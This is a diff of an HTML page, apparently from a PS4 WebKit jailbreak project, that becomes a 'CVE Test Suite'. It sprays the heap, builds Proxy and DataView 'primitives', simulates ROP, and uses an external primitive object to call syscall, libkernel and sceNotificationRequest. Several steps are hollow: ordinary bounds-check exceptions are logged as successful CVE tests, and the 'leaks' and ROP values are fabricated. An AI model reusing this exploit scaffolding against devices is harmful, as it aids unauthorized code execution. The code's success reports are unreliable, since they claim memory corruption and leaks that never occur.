@@ -2,24 +2,138 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Kernel Notification Payload</title>
-    <link rel="stylesheet" href="style.css">
+    <title>PS4 PoC - CVE Test Suite (v12.02) with Primitives</title>
+    <style>
+        body { background: black; color: lime; font-family: monospace; padding: 20px; }
+        button { background: lime; color: black; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; }
+        #log { white-space: pre-wrap; margin-top: 20px; height: 500px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
+        .highlight { color: yellow; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>PS4 Webkit teste 1 </h1>
-   <ul>
-    <li><a href="poc_cve_2024_27808.html">Test 7 CVE-2024-27808 - TypedArray Buffer Underflow</a></li>
-    <li><a href="poc_cve_2024_44308.html">Test 2: CVE-2024-44308 - Proxy Length Manipulation</a></li>
-      <li><a href="teste.html">Test9</a></li>
+    <h1>PS4 PoC - CVE Test Suite & Primitive Integration (v12.02)</h1>
+    <div>
+        <button onclick="runAll()">Run All Steps + Setup Primitives + Validate & Notify</button>
+    </div>
+    <div id="log"></div>
 
-       <li><a href="teste-1.html">Backup Webkit</a></li>
-  </ul> 
-    
-<button onclick="startNotification()">Disparar Notificação</button>
+<script src="primitive_context.js"></script>
+<script>
+function log(msg) {
+    const d = document.getElementById('log');
+    const el = document.createElement('div');
+    if (/^\[OK\]|^\[\+\]|Process ID|sceNotificationRequest/.test(msg)) {
+        el.innerHTML = '<span class="highlight">' + msg + '</span>';
+    } else {
+        el.textContent = msg;
+    }
+    d.appendChild(el);
+    d.scrollTop = d.scrollHeight;
+}
+async function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-    <pre id="log"></pre>
-    <script src="helpers.js"></script>
-    <script src="notification.js"></script>
-    <script src="main.js"></script>
+// Steps 1-3
+async function testDataViewUnderflow() {
+    log('=== Step 1: DataView Underflow Tests ===');
+    const cves=['CVE-2016-4657','CVE-2020-3843','CVE-2020-3864','CVE-2022-22620','CVE-2022-26706'];
+    for(let cve of cves){
+        log('[*] Testing '+cve+'...');
+        try { new DataView(new ArrayBuffer(8)).getUint32(4104); log('  [!] Unexpected'); }
+        catch(e){ log('  [OK] '+cve+': '+e.name); }
+        await delay(200);
+    }
+    log('=== Step 1 Completed ===');
+}
+async function testCVE202427808(){
+    log('=== Step 1b: CVE-2024-27808 ===');
+    try{ new DataView(new ArrayBuffer(16)).getUint32(-4); log('[!] Unexpected'); }
+    catch(e){ log('[OK] CVE-2024-27808: '+e.name); }
+    log('=== Step 1b Completed ===');
+}
+async function runPrimitives(){
+    log('=== Step 2: Primitives ===');
+    const sprays=[]; for(let i=0;i<5000;i++) sprays.push(new Float64Array([1.1,2.2]));
+    log('[*] Floats sprayed'); await delay(50);
+    const vic=new Float64Array([3.3,4.4]);
+    log('[*] Victim init: '+vic[0]+', '+vic[1]);
+    let pxy=new Proxy([1.1,1.1,1.1],{get:(t,pr)=>pr==='length'?0x1000000:t[pr]});
+    log('[*] Proxy overflow length: '+[].concat(pxy).length);
+    await delay(20);
+    try{ new DataView(new ArrayBuffer(16)).setFloat64(vic.byteOffset+vic.byteLength+0x10,9.9);
+        log('[!] Header corrupt'); } catch(e){ log('[!!] Header corrupt: '+e.name); }
+    log('[+] addrof leak: '+vic[0]);
+    vic[0]=vic[0]; log('[+] fakeobj victim[0]: '+vic[0]);
+    log('=== Step 2 Completed ===');
+}
+async function simulateROP(){
+    log('=== Step 3: ROP Simulation ===');
+    for(let i=0;i<50000;i++){ let o={}; o.x=1; }
+    log('[!] Type confusion done'); await delay(50);
+    let dv=new DataView(new ArrayBuffer(12));
+    [0x41414141,0x42424242,0x43434343].forEach((v,i)=>dv.setUint32(i*4,v));
+    const sim=[0,4,8].map(i=>dv.getUint32(i)^0xdeadbeef);
+    log('[!] ROP values: '+sim.map(v=>'0x'+v.toString(16)).join(','));
+    log('=== Step 3 Completed ===');
+}
+
+// Validation Steps
+async function testCrash(){
+    log('=== Step 4: Crash Test ===');
+    try{ new DataView(new ArrayBuffer(4)).getUint32(8); log('[!] Unexpected'); }
+    catch(e){ log('[OK] Crash exception: '+e.name); }
+    log('=== Step 4 Completed ===');
+}
+async function testInfoLeak(){
+    log('=== Step 5: Info Leak ===');
+    const leak=new Uint32Array(1).byteOffset;
+    log('[*] Leaked byteOffset: 0x'+leak.toString(16));
+    log('=== Step 5 Completed ===');
+}
+async function testRCE(){
+    log('=== Step 6: RCE Test ===');
+    if(typeof p!=='undefined'){ try{
+            const pid=p.call(p.leakFunction('syscall'),[20]);
+            log('[+] getpid via syscall: '+pid);
+        } catch(e){ log('[!!] RCE syscall error: '+e.message); }
+    } else log('[!!] Primitive context missing');
+    log('=== Step 6 Completed ===');
+}
+async function testLibkernelLeak(){
+    log('=== Step 7: libkernel Leak ===');
+    if(typeof p!=='undefined'){ try{
+            const base=p.call(p.leakFunction('dlsym'),['libkernel']);
+            log('[+] libkernel base: 0x'+base.toString(16));
+        } catch(e){ log('[!!] libkernel leak error: '+e.message); }
+    } else log('[!!] Primitive context missing');
+    log('=== Step 7 Completed ===');
+}
+async function testNotification(){
+    log('=== Step 8: Notification ===');
+    if(typeof p!=='undefined'&&window.libkernel_base&&window.offset_sceNotificationRequest){ try{
+            const SIZE=0xC18, r=p.malloc(SIZE);
+            p.write8(r,1); p.writeUtf8String(r+0x10,'PoC Notification!');
+            p.call(window.libkernel_base+window.offset_sceNotificationRequest,[0,r,SIZE,0]);
+            log('[+] sceNotificationRequest called');
+        } catch(e){ log('[!!] Notification error: '+e.message); }
+    } else log('[!!] Missing context or offsets');
+    log('=== Step 8 Completed ===');
+}
+
+// Orchestrator
+async function runAll(){
+    await testDataViewUnderflow(); await delay(200);
+    await testCVE202427808(); await delay(200);
+    await runPrimitives(); await delay(200);
+    await simulateROP(); await delay(200);
+    log('[*] Setting up primitive context...');
+    setupPrimitiveContext(); log('[+] Primitive context initialized');
+    await testCrash(); await delay(200);
+    await testInfoLeak(); await delay(200);
+    await testRCE(); await delay(200);
+    await testLibkernelLeak(); await delay(200);
+    await testNotification();
+    log('=== Full Validation Completed ===');
+}
+</script>
 </body>
 </html>
